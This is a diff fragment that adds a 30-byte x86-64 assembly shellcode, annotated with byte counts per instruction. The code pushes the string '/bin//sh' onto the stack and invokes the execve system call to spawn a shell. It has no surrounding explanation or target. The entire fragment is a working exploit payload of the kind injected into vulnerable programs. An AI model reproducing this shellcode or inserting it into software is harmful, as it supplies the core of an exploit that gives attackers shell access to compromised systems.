@@ -1,0 +1,10 @@
+    xor rax,rax                      /*  3   */
+    push rax                         /*  1   */
+    mov rbx,0x68732f2f6e69622f       /*  10  */
+    push rbx                         /*  1   */
+    lea rdi,[rsp]                    /*  4   */
+    mov ecx,eax                      /*  2   */
+    mov edx,eax                      /*  2   */
+    mov esi,eax                      /*  2   */
+    add eax,0x3b                     /*  3   */
+    syscall                          /*  2    total 30   */
